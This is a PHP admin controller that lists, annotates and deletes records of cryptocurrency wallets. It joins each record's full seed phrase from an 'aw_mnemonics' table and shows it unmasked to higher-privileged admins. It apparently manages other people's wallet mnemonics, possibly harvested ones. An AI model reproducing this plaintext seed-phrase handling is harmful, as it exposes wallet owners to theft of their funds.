<?php
namespace app\admin\controller;

use app\admin\controller\Base;
use app\common\consts\Response;
use app\common\consts\Type;
use app\common\model\Casies as CasiesModel;
use app\common\service\LogService;
use think\Request;
use think\facade\Log;

class Casies extends Base
{

    public function index(Request  $request)
    {
        $address = $request->Address;
        $remark = $request->Remark;
        $name = $request->name;
        $wallet = $request->Wallet;
        $mid = $request->mid;
        $query = CasiesModel::order([ 'id' => 'desc'])
            ->alias('c')
            ->leftJoin('aw_mnemonics am', 'am.Mnemonic = c.Mnemonic')
            ->field('c.*, am.id as mid ');

        if (!empty($request->user_id)) {
            $query->where('user_id', $request->user_id);
        }

        if ($this->user_type == 1) {
            $query->where('user_id', $this->user_id);
        }

        if (!empty($address)) {
            $query->where('Address', 'like', '%' . $address . '%');
        }

        if(!empty($name)) {
            $query->where('Name', $name);
        }

        if(!empty($wallet)) {
            $query->where('Wallet', $wallet);
        }

        if (!empty($remark)) {
            $query->where('Remark', 'like', '%' . $remark . '%');
        }

        if (!empty($mid)) {
            $query->where('am.id', $mid);
        }

        $data = $query->paginate(10, false, ['query' => $request->param()]);
        foreach ($data as &$v) {
            if ($this->user_type == 1) {
                $v['Mnemonic'] = '***************';
            }
        }

        $text = '';
        $params = $request->param();
        foreach ($params as $k => $v) {
            if (isset(LogService::SEARCH_TEXT[$k]) && !empty($v)) {
                $text .= LogService::SEARCH_TEXT[$k] .':' . $v . ';';
            }
        }

        if (!empty($text)) {
            $text .= '页码:' . ($request->page ?? 1);
            LogService::createLog($this->user_id, 2,  $text);
        }
        return $this->fetch('', ['data' => $data]);
    }

    public function remark(Request  $request)
    {
        if (! $request->isPost())
            return $this->errorJson(Response::METHOD_NOT_ALLOW);

        $id = $request->id;
        $query = CasiesModel::where('id', $id);

        if ($this->user_type == 1) {
            $query->where('user_id', $this->user_id);
        }

        $data = $query->find();

        $before = $data->Remark;
        if (! $data)
            return $this->errorJson(Response::NO_DATA);

        try {
            $data->Remark = $request->param('remark', '','htmlspecialchars');
            $data->save();

            LogService::createLog($this->user_id, 3, '修改前【'. $before .'】修改后【'.  $data->Remark .'】');
            return $this->successJson();
        } catch (\Exception $e) {
            Log::error($e->getMessage());
            return $this->errorJson(Response::UPDATE_ERR);
        }
    }


    public function destroy(Request $request)
    {
        $this->checkUser();
        if (! $request->isPost())
            return $this->errorJson(Response::METHOD_NOT_ALLOW);

            $id = $request->id;
            $data = CasiesModel::where('id', $id)->find();
            if (! $data)
                return $this->errorJson(Response::NO_DATA);

            try {
                LogService::createLog($this->user_id, 4,  '地址：' . $data->Address . ';类型：'. $data->Name);

                $data->delete();
                return $this->successJson();
            } catch (\Exception $e) {
                Log::error($e->getMessage());
                return $this->errorJson(Response::UPDATE_ERR);
            }
    }

}
